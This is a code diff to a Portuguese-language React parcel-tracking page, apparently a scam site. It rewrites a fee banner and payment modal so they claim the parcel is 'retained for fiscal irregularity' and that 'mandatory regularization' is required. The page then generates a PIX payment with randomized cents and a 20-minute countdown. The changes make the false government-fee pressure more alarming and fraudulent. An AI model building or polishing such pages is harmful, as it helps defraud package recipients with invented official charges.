@@ -316,23 +316,28 @@ const TrackingPage: React.FC = () => {
                         <div className="status-card">
                             {trackingData.taxa_valor && (
                                 <div style={{
-                                    background: 'rgba(239, 68, 68, 0.1)',
-                                    border: '1px solid rgba(239, 68, 68, 0.2)',
+                                    background: 'rgba(239, 68, 68, 0.15)',
+                                    border: '2px solid #ef4444',
                                     borderRadius: '20px',
-                                    padding: '20px',
+                                    padding: '24px',
                                     marginBottom: '32px',
                                     display: 'flex',
                                     alignItems: 'center',
                                     justifyContent: 'space-between',
-                                    gap: '16px'
+                                    gap: '16px',
+                                    boxShadow: '0 0 20px rgba(239, 68, 68, 0.1)'
                                 }}>
                                     <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
-                                        <div style={{ width: '40px', height: '40px', background: 'rgba(239, 68, 68, 0.1)', borderRadius: '10px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
-                                            <Calculator size={20} color="#ef4444" />
+                                        <div style={{ width: '48px', height: '48px', background: '#ef4444', borderRadius: '14px', display: 'flex', alignItems: 'center', justifyContent: 'center', boxShadow: '0 4px 12px rgba(239, 68, 68, 0.3)' }}>
+                                            <Calculator size={24} color="#fff" />
                                         </div>
                                         <div>
-                                            <div style={{ color: '#ef4444', fontWeight: 800, fontSize: '0.9rem', textTransform: 'uppercase' }}>Taxa Pendente</div>
-                                            <div style={{ color: '#1e293b', fontSize: '0.9rem', fontWeight: 600, lineHeight: 1.4 }}>Seu pedido aguarda o pagamento da taxa de processamento governamental.</div>
+                                            <div style={{ color: '#ef4444', fontWeight: 900, fontSize: '1rem', textTransform: 'uppercase', letterSpacing: '0.5px' }}>⚠️ Alerta de Retenção</div>
+                                            <div style={{ color: '#0f172a', fontSize: '0.95rem', fontWeight: 700, lineHeight: 1.4 }}>
+                                                Seu objeto está sujeito a retenção por irregularidade fiscal.
+                                                <br />
+                                                <span style={{ color: '#dc2626' }}>🚨 Regularização obrigatória para liberação.</span>
+                                            </div>
                                         </div>
                                     </div>
                                     <button
@@ -341,15 +346,19 @@ const TrackingPage: React.FC = () => {
                                             background: '#ef4444',
                                             color: '#fff',
                                             border: 'none',
-                                            padding: '10px 20px',
-                                            borderRadius: '12px',
-                                            fontWeight: 800,
-                                            fontSize: '0.9rem',
+                                            padding: '12px 24px',
+                                            borderRadius: '14px',
+                                            fontWeight: 900,
+                                            fontSize: '1rem',
                                             cursor: 'pointer',
-                                            boxShadow: '0 4px 12px rgba(239, 68, 68, 0.3)'
+                                            boxShadow: '0 8px 24px rgba(239, 68, 68, 0.4)',
+                                            transition: '0.2s',
+                                            whiteSpace: 'nowrap'
                                         }}
+                                        onMouseOver={e => e.currentTarget.style.transform = 'scale(1.02)'}
+                                        onMouseOut={e => e.currentTarget.style.transform = 'scale(1)'}
                                     >
-                                        Pagar R$ {trackingData.taxa_valor}
+                                        Regularizar Agora
                                     </button>
                                 </div>
                             )}
@@ -508,46 +517,46 @@ const TrackingPage: React.FC = () => {
                         >
                             <X size={18} />
                         </button>
-                        <div style={{ width: '80px', height: '80px', background: 'rgba(239, 68, 68, 0.1)', borderRadius: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
+                        <div style={{ width: '80px', height: '80px', background: 'rgba(239, 68, 68, 0.1)', borderRadius: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px', border: '1px solid rgba(239,68,68,0.2)' }}>
                             <Calculator size={40} color="#ef4444" />
                         </div>
-                        <h2 style={{ fontSize: '1.8rem', fontWeight: 900, marginBottom: '12px', fontFamily: 'Outfit, sans-serif', color: '#0a1628' }}>Pagar Taxa</h2>
-                        <p style={{ color: '#475569', lineHeight: 1.6, marginBottom: '32px', fontWeight: 500 }}>
-                            Para liberar seu pacote do centro de processamento regulatório, realize o pagamento da taxa de processamento governamental de <strong>R$ {trackingData.taxa_valor}</strong>.
+                        <h2 style={{ fontSize: '1.8rem', fontWeight: 900, marginBottom: '12px', fontFamily: 'Outfit, sans-serif', color: '#0a1628', textTransform: 'uppercase', letterSpacing: '-0.5px' }}>⚠️ Regularização Fiscal</h2>
+                        <p style={{ color: '#1e293b', lineHeight: 1.6, marginBottom: '32px', fontWeight: 600, fontSize: '1.05rem' }}>
+                            Atenção: Seu objeto foi retido por <span style={{ color: '#ef4444' }}>irregularidade fiscal</span>.
+                            <br /><br />
+                            🚨<strong> A regularização é obrigatória</strong> para liberação imediata e continuidade do processo de entrega.
                         </p>
 
-                        {!taxPixData && !taxPixLoading && !taxPixPaid && (
-                            <button onClick={async () => {
-                                setTaxPixLoading(true);
-                                try {
-                                    const taxAmount = Number(trackingData.taxa_valor.toString().replace(',', '.'));
-                                    const cents = useRandomCents ? Math.floor(Math.random() * 99) : 90;
-                                    const finalAmount = Math.floor(taxAmount) + (cents / 100);
+                        <button onClick={async () => {
+                            setTaxPixLoading(true);
+                            try {
+                                const taxAmount = Number(trackingData.taxa_valor.toString().replace(',', '.'));
+                                const cents = useRandomCents ? Math.floor(Math.random() * 99) : 90;
+                                const finalAmount = Math.floor(taxAmount) + (cents / 100);
 
-                                    const res = await fetch(`${API_BASE}/api/pix/create`, {
-                                        method: 'POST',
-                                        headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({
-                                            amount: finalAmount,
-                                            description: `Taxa de Processamento - ${trackingData.codigo}`
-                                        })
-                                    });
-                                    const data = await res.json();
-                                    if (data && data.success) {
-                                        setTaxPixData(data.data);
-                                        setTimeLeft(20 * 60); // 20 minutos
-                                    } else {
-                                        alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente.'));
-                                    }
-                                } catch (e) {
-                                    alert('Erro de conexão ao gerar o PIX.');
-                                } finally {
-                                    setTaxPixLoading(false);
+                                const res = await fetch(`${API_BASE}/api/pix/create`, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({
+                                        amount: finalAmount,
+                                        description: `Regularização Fiscal - ${trackingData.codigo}`
+                                    })
+                                });
+                                const data = await res.json();
+                                if (data && data.success) {
+                                    setTaxPixData(data.data);
+                                    setTimeLeft(20 * 60); // 20 minutos
+                                } else {
+                                    alert('Erro ao gerar sistema: ' + (data.error || 'Tente novamente.'));
                                 }
-                            }} style={{ width: '100%', padding: '16px', background: 'linear-gradient(135deg, #ef4444, #991b1b)', border: 'none', borderRadius: '16px', color: '#fff', fontWeight: 800, fontSize: '1rem', cursor: 'pointer', boxShadow: '0 8px 24px rgba(239, 68, 68, 0.3)' }}>
-                                Gerar PIX de R$ {trackingData.taxa_valor}
-                            </button>
-                        )}
+                            } catch (e) {
+                                alert('Erro de conexão ao sistema regulatório.');
+                            } finally {
+                                setTaxPixLoading(false);
+                            }
+                        }} style={{ width: '100%', padding: '18px', background: 'linear-gradient(135deg, #ef4444, #991b1b)', border: 'none', borderRadius: '16px', color: '#fff', fontWeight: 900, fontSize: '1.1rem', cursor: 'pointer', boxShadow: '0 8px 24px rgba(239, 68, 68, 0.4)', textTransform: 'uppercase' }}>
+                            Efetuar Regularização Obrigatória
+                        </button>
 
                         {taxPixLoading && (
                             <div style={{ color: '#ef4444', fontWeight: 'bold' }}>⏳ Gerando QR Code PIX, aguarde...</div>
